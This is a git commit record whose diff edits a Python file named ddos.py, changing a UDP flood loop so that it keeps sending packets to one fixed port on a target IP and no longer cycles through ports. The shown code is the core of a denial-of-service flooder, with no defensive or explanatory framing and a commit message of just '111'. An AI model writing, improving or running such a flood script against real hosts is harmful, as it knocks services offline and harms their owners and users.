f0ae878343e654528f8138397961d5464924d3a1
liguoqing19861028@163.com <liguoqing19861028@163.com>
2018-11-28 17:19:19 +0800

    111

--- python/common/ddos.py
+++ python/common/ddos.py
@@ -40,7 +40,7 @@ sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port = port + 1 
+     port = port 
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
